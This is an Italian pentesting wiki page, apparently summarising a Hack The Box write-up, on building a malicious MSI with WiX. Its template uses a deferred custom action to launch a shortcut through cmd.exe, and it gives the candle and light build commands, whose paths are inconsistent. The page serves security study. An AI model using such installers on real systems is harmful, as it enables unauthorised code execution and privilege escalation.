{{#include ../../banners/hacktricks-training.md}}

# Creazione di MSI Maliziosi e Ottenimento di Root

La creazione dell'installer MSI sarà effettuata utilizzando wixtools, in particolare verranno utilizzati [wixtools](http://wixtoolset.org). Vale la pena menzionare che sono stati tentati costruttori MSI alternativi, ma non hanno avuto successo in questo caso particolare.

Per una comprensione completa degli esempi di utilizzo di wix MSI, è consigliabile consultare [questa pagina](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Qui puoi trovare vari esempi che dimostrano l'uso di wix MSI.

L'obiettivo è generare un MSI che eseguirà il file lnk. Per raggiungere questo obiettivo, potrebbe essere impiegato il seguente codice XML ([xml da qui](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
È importante notare che l'elemento Package contiene attributi come InstallerVersion e Compressed, che specificano la versione dell'installer e indicano se il pacchetto è compresso o meno, rispettivamente.

Il processo di creazione prevede l'utilizzo di candle.exe, uno strumento di wixtools, per generare un wixobject da msi.xml. Il seguente comando dovrebbe essere eseguito:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Inoltre, vale la pena menzionare che un'immagine è fornita nel post, che mostra il comando e il suo output. Puoi fare riferimento ad essa per una guida visiva.

Inoltre, light.exe, un altro strumento di wixtools, sarà utilizzato per creare il file MSI dall'wixobject. Il comando da eseguire è il seguente:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Simile al comando precedente, un'immagine è inclusa nel post che illustra il comando e il suo output.

Si prega di notare che, sebbene questo riepilogo miri a fornire informazioni preziose, si consiglia di fare riferimento al post originale per dettagli più completi e istruzioni accurate.

## Riferimenti

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
